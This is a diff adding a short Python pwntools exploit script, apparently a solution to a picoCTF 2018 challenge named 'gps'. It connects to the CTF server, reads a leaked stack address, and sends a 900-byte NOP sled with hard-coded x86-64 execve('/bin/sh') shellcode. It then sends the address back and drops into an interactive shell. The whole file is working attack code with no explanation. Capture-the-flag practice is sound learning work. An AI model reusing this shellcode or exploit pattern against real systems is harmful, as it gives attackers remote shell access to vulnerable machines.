@@ -1,0 +1,23 @@
+from pwn import *
+
+sh = remote('2018shell.picoctf.com', 58896)
+#sh = process('./gps')
+
+info = sh.recvuntil('> ')
+print info
+index = info.find('0x7f')
+address = info[index:14+index+1]
+print address
+print address[2:]
+guess_address = int(address, 16) + 500
+
+SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+NOPSLED = "\x90"*900
+
+payload1 = NOPSLED + SHELLCODE
+payload2 = address[2:]#"7fffffffd1a5\n"
+print sh.sendline(payload1)
+print sh.recvuntil('> ')
+print sh.sendline(payload2)
+sh.interactive()
+sh.close()
